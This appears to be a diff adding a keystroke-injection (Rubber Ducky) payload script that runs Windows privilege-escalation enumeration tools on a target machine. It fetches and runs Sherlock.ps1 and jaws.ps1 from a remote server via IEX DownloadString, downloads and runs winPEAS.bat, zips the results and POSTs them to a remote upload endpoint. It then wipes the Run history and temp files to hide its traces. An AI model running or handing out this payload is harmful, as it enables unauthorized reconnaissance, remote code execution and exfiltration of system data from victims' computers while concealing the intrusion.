@@ -1,0 +1,72 @@
+REM Title: Windows Enumeration Collection version 0.1
+REM Author: Cr1ms3nRav3n
+REM **Note you may need to increase DELAY commands depending on your target system**
+REM This script will run Sherlock.ps1, jaws.ps1, and WinPEAS.bat as the current user.
+REM It will then zip the output files and upload them to a remote server
+REM *Open run on Windows and launch command prompt*
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+DELAY 50
+ENTER
+DELAY 1000
+REM *Run Sherlock.ps1 and send output to C:\Windows\Temp\sherlock.txt*
+STRING echo IEX(New-Object Net.WebClient).DownloadString('http://yourserver.here/Sherlock.ps1') | powershell -noprofile - > C:\Windows\Temp\sherlock.txt
+DELAY 50
+ENTER
+DELAY 
+REM *Run jaws.ps1 and send output to C:\Windows\Temp\jaws.txt* 
+STRING echo IEX(New-Object Net.WebClient).DownloadString('http://yourserver.here/jaws.ps1') | powershell -noprofile - > C:\Windows\Temp\jaws.txt
+DELAY 50
+ENTER
+DELAY 9000
+DELAY 9000
+DELAY 9000
+DELAY 9000
+DELAY 9000
+DELAY 9000
+DELAY 9000
+REM *Download and run winPEAS.bat, saves output to C:\Windows:Temp\winpeas.txt*
+STRING cd C:\Windows\Temp\
+DELAY 50
+ENTER
+DELAY 50
+STRING powershell Invoke-WebRequest -Uri http://yourserver.here/winPEAS.bat -OutFile winPEAS.bat
+DELAY 50
+ENTER
+DELAY 6000
+STRING .\winPEAS.bat > winpeas.txt
+DELAY 50
+ENTER
+DELAY 9000
+DELAY 9000
+DELAY 9000
+DELAY 9000
+DELAY 9000
+DELAY 9000
+DELAY 9000
+REM *Zip all txt files to a folder for upload.*
+STRING powershell Compress-Archive -Path C:\Windows\Temp\*.txt -DestinationPath C:\Windows\Temp\info.zip
+DELAY 50
+ENTER
+DELAY 6000
+REM *Upload zip archive to web server*
+STRING powershell Invoke-WebRequest -Uri http://youserver.here/i.php -method POST -infile C:\Windows\Temp\info.zip
+DELAY 50
+ENTER
+DELAY 500
+REM *Clean up all files and run history*
+STRING Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
+DELAY 50
+ENTER
+STRING del C:\Windows\Temp\* 
+DELAY 50
+ENTER
+DELAY 300
+STRING Y
+DELAY 50
+ENTER
+DELAY 6000
+ALT F4
+REM *Go check your webserver for your loot!*
